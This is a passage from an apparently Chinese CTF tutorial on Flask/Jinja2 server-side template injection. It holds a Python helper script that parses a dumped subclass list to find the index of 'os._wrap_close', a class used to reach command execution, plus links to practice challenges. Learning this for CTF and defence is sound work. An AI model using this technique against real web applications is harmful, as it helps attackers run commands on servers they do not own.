'importlib.metadata.Deprecated'>, <class 'importlib.metadata.FileHash'>, <class 'importlib.metadata.Distribution'>, <class 'importlib.metadata.DistributionFinder.Context'>, <class 'importlib.metadata.FastPath'>, <class 'importlib.metadata.Lookup'>, <class 'importlib.metadata.Prepared'>]
"""
num=0
alllist=[]
result=""
for i in classes:
    if i==">":
        result+=i
        alllist.append(result)
        result=""
    elif i=="\n" or i==",":
        continue
    else:
        result+=i
#寻找要找的类，并返回其索引
for k,v in enumerate(alllist):
    if "os._wrap_close" in v:
        print(str(k)+"->"+v)

```

## 练习题

[[HNCTF 2022 WEEK2]ez\_SSTI | NSSCTF](https://www.nssctf.cn/problem/2953)

[[HZNUCTF 2023 preliminary]flask | NSSCTF](https://www.nssctf.cn/problem/3613)

[[GWCTF 2019]你的名字 | NSSCTF](https://www.nssctf.cn/problem/259)

[[NCTF 2018]flask真香 | NSSCTF](https://www.nssctf.cn/problem/966)

[[NCTF 2018]Flask PLUS | NSSCTF](https://www.nssctf.cn/problem/965)

[[HNCTF 2022 WEEK3]ssssti | NSSCTF](https://www.nssctf.cn/problem/3022)

[[安洵杯 2020]Normal SSTI | NSSCTF](https://www.nssctf.cn/problem/910)

[[GDOUCTF 2023]<ez\_ze> | NSSCTF](https://www.nssctf.cn/problem/3745)
